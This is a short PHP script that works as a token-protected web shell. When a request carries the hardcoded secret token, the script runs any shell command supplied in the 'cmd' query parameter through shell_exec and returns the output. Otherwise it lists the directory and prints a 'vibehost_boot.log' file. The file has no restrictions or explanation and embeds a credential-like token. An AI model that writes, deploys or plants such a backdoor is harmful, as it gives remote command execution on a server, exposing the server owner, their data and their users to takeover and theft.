<?php
$token = $_GET['token'] ?? '';
$expectedToken = 'cnr_a49c786e87ed51c050f47051cb8823a7ec6172b6d6fdf1fb';

if (empty($token) || $token !== $expectedToken) {
    header('HTTP/1.0 403 Forbidden');
    echo 'Forbidden';
    exit;
}

header('Content-Type: text/plain; charset=utf-8');

$cmd = $_GET['cmd'] ?? '';
if ($cmd) {
    echo "=== Executing: $cmd ===\n";
    $output = shell_exec($cmd . ' 2>&1');
    echo $output;
} else {
    echo "=== Directory Listing ===\n";
    echo shell_exec('ls -la 2>&1');
    
    echo "\n=== VibeHost Boot Log ===\n";
    if (file_exists('vibehost_boot.log')) {
        echo file_get_contents('vibehost_boot.log');
    } else {
        echo "vibehost_boot.log not found\n";
    }
}
